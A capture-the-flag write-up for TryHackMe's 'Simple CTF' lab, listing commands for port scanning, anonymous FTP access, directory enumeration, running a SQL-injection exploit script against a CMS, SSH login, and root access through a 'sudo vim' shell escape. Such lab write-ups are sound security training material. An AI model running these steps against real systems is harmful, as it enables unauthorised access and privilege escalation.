# 🖥️ Simple CTF — TryHackMe

| Field | Details |
|---|---|
| 🏷️ Machine | Simple CTF |
| 🌐 Platform | TryHackMe |
| 🎯 Difficulty | Easy |
| 🧠 Topics | FTP, SQLi, SSH, sudo PrivEsc |
| 👤 Author | Sandeep Prasad Chowdhury |

---

## 📌 Summary

Anonymous FTP access leaks information. CMS is vulnerable to SQL injection. Credentials allow SSH login. Privilege escalation via sudo vim.

---

## 🔍 1. Recon

```bash
nmap -sCV <TARGET_IP>
```

Ports: 21, 80, 2222

---

## 📂 2. FTP

```bash
ftp anonymous@<TARGET_IP>
ls
get ForMitch.txt
cat ForMitch.txt
```

---

## 🔎 3. Web Enumeration

```bash
gobuster dir -u http://<TARGET_IP> -w common.txt
```

Found /simple

---

## 💥 4. Exploit

```bash
python3 exploit.py -u http://<TARGET_IP>/simple -w rockyou.txt
```

---

## 🔐 5. SSH

```bash
ssh mitch@<TARGET_IP> -p 2222
cat user.txt
```

---

## ⬆️ 6. PrivEsc

```bash
sudo -l
sudo vim -c ':!/bin/sh'
```

---

## 🚩 7. Root

```bash
cat /root/root.txt
```
